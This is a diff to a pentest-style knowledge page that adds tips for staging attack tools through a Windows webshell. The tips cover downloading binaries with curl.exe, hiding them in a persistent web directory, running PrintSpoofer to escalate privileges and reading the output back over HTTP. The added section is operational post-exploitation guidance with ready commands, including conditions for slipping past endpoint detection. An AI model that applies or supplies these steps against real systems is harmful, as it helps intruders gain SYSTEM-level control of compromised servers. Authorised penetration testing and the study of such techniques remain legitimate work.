@@ -166,3 +166,18 @@ Apply vendor baselines for logging, least privilege, patch cadence, and segmenta
 ## Sources
 
 - Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
+
+## Staging tools on Windows through a webshell
+
+- `C:\Windows\temp` is periodically cleaned on hardened hosts: binaries dropped there vanish. Stage tools in a directory the compromised service writes to and that survives cleaning, e.g. the app server's own `webapps\` tree, and reference them by full path.
+- `certutil -urlcache -f` is intermittently silent for larger binaries (reports success, no file on disk). Prefer Windows-native `curl.exe <url> -o <path>`; always verify with `certutil -hashfile <file> MD5` against the source hash.
+- A non-interactive webshell cannot stream tool output: run privileged binaries with output redirected into the served web path, then fetch the file over HTTP.
+
+```text
+<staged>\PrintSpoofer64.exe -c "cmd /c whoami > <webapps>\sh\p.txt 2>&1"
+curl http://<host>:8080/sh/p.txt
+```
+
+PrintSpoofer conditions for this pattern: Spooler running, SeImpersonatePrivilege held, no EDR reaping the binary.
+
+<!-- promoted-slug: webshell-windows-tool-staging -->
